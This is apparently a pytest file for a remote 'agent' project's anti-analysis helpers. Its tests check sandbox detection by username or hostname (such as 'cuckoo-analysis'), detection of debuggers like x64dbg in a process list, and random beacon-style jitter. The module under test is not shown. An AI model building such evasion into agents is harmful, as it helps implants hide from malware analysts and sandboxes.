"""
Tests for agent anti-analysis and transport-hardening helpers.

Run from the project root:
    cd agent
    python -m pytest tests/test_anti_analysis.py -v
"""
import sys
import os
import random

sys.path.insert(0, os.path.dirname(os.path.dirname(__file__)))

from modules.anti_analysis import run as anti_analysis_run
from modules.anti_analysis import _check_sandbox, _check_analysis_tools


class TestAntiAnalysis:
    def test_run_returns_expected_keys(self):
        result = anti_analysis_run()
        assert "safe" in result
        assert "checks" in result
        assert "detected" in result
        assert isinstance(result["safe"], bool)

    def test_sandbox_detected_for_sandbox_username(self, monkeypatch):
        monkeypatch.setenv("USERNAME", "sandbox_user")
        # Force a non-matching hostname so only the username triggers detection.
        monkeypatch.setattr("platform.node", lambda: "corp-laptop")
        assert _check_sandbox() is True

    def test_sandbox_detected_for_sandbox_hostname(self, monkeypatch):
        monkeypatch.setenv("USERNAME", "jdoe")
        monkeypatch.setattr("platform.node", lambda: "cuckoo-analysis")
        assert _check_sandbox() is True

    def test_sandbox_not_detected_for_clean_environment(self, monkeypatch):
        monkeypatch.setenv("USERNAME", "jdoe")
        monkeypatch.setattr("platform.node", lambda: "corp-laptop-01")
        assert _check_sandbox() is False


class TestAnalysisTools:
    def test_analysis_tools_detect_debugger(self, monkeypatch):
        fake_output = "chrome.exe\nx64dbg.exe\nnotepad.exe"

        def fake_check_output(*args, **kwargs):
            return fake_output

        monkeypatch.setattr("subprocess.check_output", fake_check_output)
        assert _check_analysis_tools() is True

    def test_analysis_tools_clean_when_no_tools(self, monkeypatch):
        fake_output = "chrome.exe\nnotepad.exe\ncode.exe"

        def fake_check_output(*args, **kwargs):
            return fake_output

        monkeypatch.setattr("subprocess.check_output", fake_check_output)
        assert _check_analysis_tools() is False


class TestJitterHelpers:
    def test_random_jitter_range(self):
        """Jitter should stay within requested bounds."""
        values = [random.uniform(0.0, 2.0) for _ in range(50)]
        assert all(0.0 <= v <= 2.0 for v in values)

    def test_random_jitter_variance(self):
        values = {round(random.uniform(0.0, 2.0), 3) for _ in range(100)}
        assert len(values) > 1
